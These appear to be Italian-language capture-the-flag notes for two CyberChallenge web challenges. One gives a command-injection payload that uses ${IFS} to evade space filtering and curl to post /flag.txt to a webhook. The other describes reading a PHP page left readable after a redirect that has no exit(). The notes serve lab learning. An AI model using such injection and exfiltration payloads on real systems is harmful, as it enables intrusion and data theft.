
## Basic RCE:

==link== = “[http://basicrce.challs.cyberchallenge.it/](http://basicrce.challs.cyberchallenge.it/)”

==solve:==
inviare una richiesta POST contenente la flag a un webhook.

==note:==
[[Special Characters and Regex in Shell Commands#Regex|Regex]]
${IFS} - (sostitutivo di spazio per bash)
$(bash cmd) - (command sostitution)
[[Shell Commands|Shell Commands]]
awk - per comporre le stringhe

==input:==

```bash
www.google.com|curl${IFS}-d${IFS}"idx=$(cat${IFS}/flag.txt)"${IFS}-X${IFS}POST${IFS}<webhook link>
```
------
## Admin:Admin

==link== = "http://adminadmin.challs.cyberchallenge.it/admin.php"

==solve:==
nello script PHP della pagina admin.php possiamo vedere che dopo il controllo dell'autenticazione della sessione viene settato `header(Location:login.php)`, tuttavia manca un `exit()` o un `die()` per terminare i dati nella risposta.
Dunque si ottiene un redirect con un body.

Curl ottiene l'header ma non fa il redirect, legge la singola risposta ricevuta.


```bash
curl -v -X GET http://adminadmin.challs.cyberchallenge.it/admin.php
```
---
